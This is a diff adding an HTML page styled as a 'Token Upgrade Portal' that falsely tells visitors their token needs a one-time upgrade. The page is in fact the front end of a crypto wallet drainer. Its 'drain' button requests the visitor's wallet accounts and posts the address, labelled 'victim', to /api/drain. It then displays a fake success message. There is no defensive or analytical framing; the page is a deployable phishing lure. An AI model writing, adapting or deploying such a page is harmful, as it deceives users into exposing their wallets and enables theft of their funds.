@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Token Upgrade Portal</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+    .card { background: #1e293b; border-radius: 12px; padding: 2rem; max-width: 420px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,.4); }
+    h1 { font-size: 1.3rem; margin-top: 0; }
+    .addr { font-family: monospace; font-size: .8rem; color: #94a3b8; word-break: break-all; }
+    button { background: #3b82f6; color: #fff; border: 0; border-radius: 8px; padding: .8rem 1.4rem; font-size: 1rem; cursor: pointer; width: 100%; margin-top: 1rem; }
+    button:disabled { opacity: .6; cursor: wait; }
+    .status { margin-top: 1rem; font-size: .9rem; color: #94a3b8; min-height: 1.2em; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Token Upgrade Portal</h1>
+    <p>Your token requires a one-time upgrade to continue receiving transfers.</p>
+    <p class="addr">Token: %TOKEN_ADDRESS%</p>
+    <button id="drain">Approve &amp; Upgrade</button>
+    <div class="status" id="status"></div>
+  </div>
+  <script>
+    const TOKEN = "%TOKEN_ADDRESS%";
+    const btn = document.getElementById("drain");
+    const status = document.getElementById("status");
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      status.textContent = "Contacting chain...";
+      try {
+        const r = await fetch("/api/drain", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victim: window.ethereum ? (await window.ethereum.request({ method: "eth_requestAccounts" }))[0] : "0x0000000000000000000000000000000000000000" })
+        });
+        const j = await r.json();
+        status.textContent = j.ok ? "Upgraded! Tx: " + j.tx : "Error: " + j.error;
+      } catch (e) {
+        status.textContent = "Error: " + e.message;
+      }
+      btn.disabled = false;
+    });
+  </script>
+</body>
+</html>
